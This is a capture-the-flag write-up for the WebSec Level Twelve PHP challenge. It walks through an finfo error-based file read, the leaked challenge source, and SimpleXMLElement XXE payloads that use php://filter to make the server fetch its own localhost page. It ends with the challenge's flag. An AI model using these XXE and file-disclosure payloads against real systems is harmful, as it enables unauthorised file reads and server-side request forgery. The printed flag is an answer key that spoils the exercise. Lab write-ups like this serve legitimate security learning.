Ok so this was a pretty hard level.
At first I tried to treat this as a blackbox and to bypass the class name check but nothing worked.
I then tried to search for pre declared classes, that take at least 2 parameters that are strings or something that a string could be casted to (for example integer).

I wrote this code to help me see those functions:




```
$classes = get_declared_classes();

foreach ($classes as $class) {
    $refClass = new ReflectionClass($class);

    if ($refClass->hasMethod('__construct')) {
        $constructor = $refClass->getMethod('__construct');

        if ($constructor->class !== $class) {
            continue;
        }

        $params = $constructor->getParameters();

        if (count($params) < 2) {
            continue;
        }

        echo "Class: $class\n";
        echo "Constructor: function __construct(";

        $paramStrs = [];
        foreach ($params as $param) {
            $paramStr = '$' . $param->getName();

            if ($param->isOptional()) {
                try {
                    $default = var_export($param->getDefaultValue(), true);
                    $paramStr .= ' = ' . $default;
                } catch (ReflectionException $e) {
                    $paramStr .= ' = ?';
                }
            }

            $paramStrs[] = $paramStr;
        }

        echo implode(', ', $paramStrs);
        echo ")\n\n";
    }
}
```

Which printed me said functions, now what I didn't realise at the time was that this script didn't work well, some base classes do have a constructor but it's C internal and php can't "see it". Which made me miss some functions.

After I spent **a while** looking at the functions this gave me, I noticed that there are functions that I didn't check that I can call construct on.
So I decided to look at them one by one.
At some point I reached a function that looked interesting - finfo.
I tried calling it like:
```echo new finfo(0, index.php)``` - This printed the contents of it but in a really bad way, printing that each line there had an error so I got the contents of index.php
What happened was that this class expects a database as its second string, so when I gave it index.php, it tried opening it and saw it's not a database so it threw errors for every line there, giving me the option to read the file.

In retrospect I could've achieved this with what I did after this using XXE.

Then the content I got was this:

```
<!DOCTYPE html>
<html>
<head>
	<title>#WebSec Level Twelve</title>

    <link href="/static/bootstrap.min.css" rel="stylesheet" />
    <link href="/static/websec.css" rel="stylesheet" />

    <link rel="icon" href="/static/favicon.png" type="image/png">
</head>
	<body>
		<div id="main">
			<div class="container">
				<div class="row">
					<h1>LevelTwelve <small> - This time, it's different.</small></h1>
				</div>
				<div class="row">
					<p class="lead">
						Since we trust you <em>very much</em>, you can instanciate a class of your choice, with two arbitrary parameters.</br>
						Well, except the dangerous ones, like <code>splfileobject</code>, <code>globiterator</code>, <code>filesystemiterator</code>,
						and <code>directoryiterator</code>.<br>
 						Lets see what you can do with this.
                    			</p>
				</div>
			</div>
			<br>
			<div class="container">
				<div class="row">
					<form name="username" method="post" class="form-inline">
						<samp>
						<div class="form-group">
							<label for="class" class="sr-only">class</label>
							echo <span class='text-success'>new</span>
							<input type="text" class="form-control" id="class" name="class" placeholder="class" required>
							(
						</div>
						<div class="form-group">
							<label for="param1" class="sr-only">first parameter</label>
							<input type="text" class="form-control" id="param1" name="param1" placeholder="first parameter" required>
							,
						</div>
						<div class="form-group">
							<label for="param2" class="sr-only">second parameter</label>
							<input type="text" class="form-control" id="param2" name="param2" placeholder="second parameter" required>
							);
						</div>
						</samp>
      						<button type="submit" class="btn btn-default">launch!</button>
					</form>
				</div>
                <?php
                ini_set('display_errors', 'on');
                ini_set('error_reporting', E_ALL);

                if (isset ($_POST['class']) && isset ($_POST['param1'])  && isset ($_POST['param2'])) {
                    $class = strtolower ($_POST['class']);

                    if (in_array ($class, ['splfileobject', 'globiterator', 'directoryiterator', 'filesystemiterator'])) {
			    die ('Dangerous class detected.');
                    } else {
			    $result = new $class ($_POST['param1'], $_POST['param2']);
			    echo '<br><hr><br><div class="row"><pre>' . $result . '</pre></div>';
		    }
                }
                ?>
			</div>
		</div>
	</body>
</html>

<?php
/*
Congratulation, you can read this file, but this is not the end of our journey.

- Thanks to cutz for the QA.
- Thanks to blotus for finding a (now fixed) weakness in the "encryption" function.
- Thanks to nurfed for nagging us about a cheat
*/

$text = 'Niw0OgIsEykABg8qESRRCg4XNkEHNg0XCls4BwZaAVBbLU4EC2VFBTooPi0qLFUELQ==';
$key = ini_get ('user_agent');

if ($_SERVER['REMOTE_ADDR'] === '127.0.0.1') {
    if ($_SERVER['HTTP_USER_AGENT'] !== $key) {
    	die ("Cheating is bad, m'kay?");
    }
    
    $i = 0;
    $flag = '';
    foreach (str_split (base64_decode ($text)) as $letter) {
        $flag .= chr (ord ($key[$i++]) ^ ord ($letter));
    }
    die ($flag);
}
?>
```


Which shows that there is another php script, that checks the incoming IP and user_agent, if it's right it prints out the flag.
This is obviously a CSRF that I need to do to make the server get the index.php file itself and get the contents.

I then searched online and looked for different ways to include another page on a remove server using a class initialization.
I discovered XXE and searched for classes that can maybe help me, I found SimpleXmlElement.
I then searched XXE SimpleXmlElement and found this - https://github.com/ngallagher/simplexml/issues/18

I tried this locally untill I got it to work.
my payload was this:
```
Class = SimpleXmlElement
param1 = "<!DOCTYPE r [<!ENTITY page SYSTEM 'index.php'>]><foo>&page;</foo>"
param2 = "2" - LIBXML_NOENT
```
But what I got was a lot of errors which looked like the page I'm trying to include isn't XML compatible so it's bugging out.
Then I had an idea to use a base64 convertion filter and decode it locally after i get it, so my payload was:
```
Class = SimpleXmlElement
param1 = "<!DOCTYPE r [<!ENTITY page SYSTEM 'php://filter/read=convert.base64-encode/resource=index.php'>]><foo>&page;</foo>"
param2 = "2"
```
Which gave me a base64 string :)
But when I decoded it it just gave me the contents of index.php without the flag.
This got me wondering, why wasn't the ip of the sender the server's and the useragent the same?
And then I figured it out, when I include it like this, it's still my request, I need the xml to request itself the page.
So I changed my payload to this:
```
Class = SimpleXMLElement
param1 = "<!DOCTYPE r [<!ENTITY page SYSTEM 'php://filter/read=convert.base64-encode/resource=http://127.0.0.1/level12/index.php'>]><foo>&page;</foo>"
param2 = "2"
```
Which gave me the flag - WEBSEC{Many_thanks_to_hackyou2014_web400_MSLC_<3} :)